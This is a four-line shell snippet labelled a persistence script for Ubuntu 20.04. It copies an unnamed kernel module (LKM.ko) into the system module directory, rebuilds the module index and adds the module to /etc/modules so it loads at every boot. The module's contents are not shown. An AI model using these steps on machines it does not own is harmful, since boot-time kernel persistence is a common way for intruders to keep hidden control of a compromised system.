# Persistence script (tested Ubuntu LTS 20.04)
sudo cp ./LKM.ko /lib/modules/$(uname -r)/kernel/lib/
depmod -a
echo "LKM" >> /etc/modules
